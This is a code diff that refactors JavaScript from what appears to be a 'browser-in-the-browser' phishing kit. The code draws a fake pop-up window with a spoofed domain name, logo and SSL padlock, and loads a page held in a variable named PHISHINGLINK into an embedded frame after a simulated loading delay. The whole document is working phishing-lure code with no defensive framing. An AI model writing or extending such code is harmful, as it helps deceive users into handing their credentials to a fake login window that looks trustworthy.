@@ -76,17 +76,12 @@ title.on('mousedown', function(e){
 			dr.removeClass("drag");
 	});
 });
-//////////////// Make window draggable end ////////////////
-
-init();
-document.querySelector("#content").src = PHISHINGLINK;
-document.querySelector("#domain-name-verify").textContent = DOMAINNAMEVERIFY;
 
 ////////////////// Onclick listeners //////////////////
 // X button functionality
 $("#exit").click(function () {
-  $("#window").css("display", "none");
-  $("#ssl-certificate").css("display", "none");
+  $("#window").hide();
+  $("#ssl-certificate").hide();
   init();
   $("#content").css("visibility", "hidden");
 });
@@ -109,32 +104,38 @@ function enlarge(){
   }
 }
 
+////////////////// Init objective //////////////////
+
+init();
+$("#content").attr("src", PHISHINGLINK);
+$("#domain-name-verify").text(DOMAINNAMEVERIFY);
+
 $("#clickme").click(function () {
-  $("#window").css("display", "block");
+  $("#window").show();
   setTimeout(loaded, loadTIME);
 });
 
 function loaded() {
-  document.querySelector("#logo-description").textContent = TITLE;
-  document.querySelector("#domain-name").textContent = DOMAINNAME;
-  document.querySelector("#domain-path").textContent = DOMAINPATH;
-  document.querySelector("#logo").src = LOGO;
+  $("#logo-description").text(TITLE);
+  $("#domain-name").text(DOMAINNAME);
+  $("#domain-path").text(DOMAINPATH);
+  $("#logo").attr("src", LOGO);
   $("#content").css("visibility", "visible");
 }
 
 function init(){
-  document.querySelector("#logo-description").textContent = loadTITLE;
-  document.querySelector("#domain-name").textContent = loadDOMAINNAME;
-  document.querySelector("#domain-path").textContent = loadDOMAINPATH;
-  document.querySelector("#logo").src = loadLOGO;
+  $("#logo-description").text(loadTITLE);
+  $("#domain-name").text(loadDOMAINNAME);
+  $("#domain-path").text(loadDOMAINPATH);
+  $("#logo").attr("src", loadLOGO);
 }
 
 // SSL check functionality
 
 $("#ssl-padlock").click(function () {
-  $("#ssl-certificate").css("display", "block");
+  $("#ssl-certificate").toggle();
 });
 
 $(".ssl-close").click(function () {
-  $("#ssl-certificate").css("display", "none");
+  $("#ssl-certificate").hide();
 });
